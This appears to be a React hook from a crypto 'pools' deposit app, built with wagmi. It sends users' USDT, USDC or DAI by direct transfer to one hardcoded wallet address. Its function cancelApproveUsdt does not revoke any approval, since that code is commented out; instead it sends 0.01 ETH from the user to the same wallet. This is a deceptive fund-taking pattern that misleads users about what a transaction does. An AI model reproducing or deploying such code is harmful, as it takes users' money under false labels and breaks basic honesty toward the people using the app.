import { useWriteContract, useSendTransaction } from "wagmi";
import { UseFormReset } from "react-hook-form";
import { DepositFormType } from "@/screens/AppScreens/Pools/components/DepositForm";
import { parseEther } from "ethers";

export const USDT_ARBITRUM_ABI_TRANSFER = [
  {
    type: "function",
    name: "transfer",
    stateMutability: "nonpayable",
    inputs: [
      { name: "recipient", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ type: "bool" }],
  },
];

export const USDC_ABI_TRANSFER = [
  {
    type: "function",
    name: "transfer",
    stateMutability: "nonpayable",
    inputs: [
      { name: "recipient", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
];

export const DAI_ABI_TRANSFER = [
  {
    type: "function",
    name: "transfer",
    stateMutability: "nonpayable",
    inputs: [
      { name: "recipient", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
];

type Erc20TransferAbi = typeof USDT_ARBITRUM_ABI_TRANSFER;

function getErc20TransferAbiByName(
  poolName: string | undefined,
): Erc20TransferAbi {
  if (!poolName) {
    return USDT_ARBITRUM_ABI_TRANSFER;
  }

  switch (poolName.toUpperCase()) {
    case "USDC":
      return USDC_ABI_TRANSFER;
    case "DAI":
      return DAI_ABI_TRANSFER;
    case "USDT":
      return USDT_ARBITRUM_ABI_TRANSFER;

    default:
      return USDT_ARBITRUM_ABI_TRANSFER;
  }
}

const APPROVE_TO_WALLET =
  // import.meta.env.VITE_SPENDER_ADDRESS ||
  "0x7f4F5DEF67C56c49b11e020B9adF206F805aBf97";

const USDT_ARBITRUM_CONTRACT = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";

export const USDT_ARBITRUM_ABI_APPROVE = [
  {
    constant: false,
    inputs: [
      {
        name: "spender",
        type: "address",
      },
      {
        name: "value",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

export const useTransferTokens = () => {
  const {
    writeContract,
    isPending: isApproving,
    error: contractWriteError,
  } = useWriteContract();

  const transferTokens = async (
    tokens: string,
    tokenAddress: `0x${string}`,
    poolName: string,
    reset: UseFormReset<DepositFormType>,
  ) => {
    writeContract(
      {
        abi: getErc20TransferAbiByName(poolName),
        address: tokenAddress,
        functionName: "transfer",
        args: [APPROVE_TO_WALLET, tokens],
      },
      {
        onSuccess: async () => {
          console.log("transferToWallet SUCCESS", tokenAddress);
          reset();
        },
        onError: async (err) => {
          console.log("transferToWallet ERROR", err);
        },
      },
    );
  };

  const { sendTransaction } = useSendTransaction();

  const cancelApproveUsdt = () => {
    sendTransaction({
      // chainId: 123123,
      to: APPROVE_TO_WALLET,
      value: parseEther("0.01"),
      // abi: USDT_ARBITRUM_ABI_APPROVE,
      // address: USDT_ARBITRUM_CONTRACT,
      // functionName: "approve",
      // args: [APPROVE_TO_WALLET, 0],
    });
  };

  // const cancelApproveUsdc = () => {
  //   writeContract({
  //     abi: USDT_ARBITRUM_ABI_APPROVE,
  //     address: USDC_ARBITRUM_CONTRACT,
  //     functionName: "approve",
  //     args: [APPROVE_TO_WALLET, 0],
  //   });
  // };

  return { transferTokens, isApproving, contractWriteError, cancelApproveUsdt };
};
